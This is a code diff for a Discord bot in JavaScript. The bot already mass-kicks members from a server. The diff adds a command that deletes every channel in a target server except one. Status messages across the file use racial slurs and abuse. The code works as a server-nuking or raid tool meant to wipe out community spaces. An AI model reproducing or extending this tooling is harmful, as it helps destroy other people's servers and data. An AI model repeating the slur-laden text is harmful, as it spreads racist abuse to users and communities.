@@ -21,7 +21,12 @@ const messages = {
         starting: (name) => `kicking niggers off**${name}**...`,
         done: (name, kicked, failed, time) => `done,\nserver: **${name}**\nkicked: **${kicked}**\nfailed to kick: **${failed}**(its okay jarvis, youre not a nigger)\ntime taken: **${time}ms** (**${(time/1000).toFixed(2)}s**)`,
         error: "fucking ERRROO",
-        fridayStats: (kicked, time) => `jarvis counterpart arhh stats:\nkicked: **${kicked}** members\ntime: **${time}ms** (**${(time/1000).toFixed(2)}s**)`
+        fridayStats: (kicked, time) => `jarvis counterpart arhh stats:\nkicked: **${kicked}** members\ntime: **${time}ms** (**${(time/1000).toFixed(2)}s**)`,
+        channelDeleteStart: (name) => `deleting all channels in **${name}** except the specified one...`,
+        channelDeleteDone: (name, deleted, kept) => `channels deleted from **${name}**\ndeleted: **${deleted}**\nkept channel: **${kept}**`,
+        channelNotFound: "channel not found bro",
+        channelDeleteError: "error deleting channels",
+        invalidChannelID: "wrong channel id nigga"
     }
 };
 
@@ -81,6 +86,52 @@ client.on('messageCreate', async message => {
         }
 
         const serverID = args[0];
+        const channelID = args[1];
+
+        // Check if this is a channel delete operation (2 args provided)
+        if (channelID && /^\d{17,19}$/.test(channelID)) {
+            if (!serverID || !/^\d{17,19}$/.test(serverID)) {
+                return message.reply(msg.invalidID);
+            }
+
+            try {
+                const guild = await client.guilds.fetch(serverID).catch(() => null);
+                if (!guild) {
+                    return message.reply(msg.notInGuild);
+                }
+
+                const botMember = await guild.members.fetch(client.user.id);
+                if (!botMember.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS)) {
+                    return message.reply(msg.noPermission(guild.name));
+                }
+
+                const channelToKeep = guild.channels.cache.get(channelID);
+                if (!channelToKeep) {
+                    return message.reply(msg.channelNotFound);
+                }
+
+                await message.reply(msg.channelDeleteStart(guild.name));
+
+                let deletedCount = 0;
+                const allChannels = await guild.channels.fetch();
+
+                for (const channel of allChannels.values()) {
+                    if (channel.id !== channelID) {
+                        await channel.delete().catch(() => {});
+                        deletedCount++;
+                    }
+                }
+
+                await message.reply(msg.channelDeleteDone(guild.name, deletedCount, channelToKeep.name));
+
+            } catch (error) {
+                console.error('channel deletion error:', error);
+                await message.reply(msg.channelDeleteError);
+            }
+            return;
+        }
+
+        // Original kick members operation
         if (!serverID || !/^\d{17,19}$/.test(serverID)) {
             return message.reply(msg.invalidID);
         }
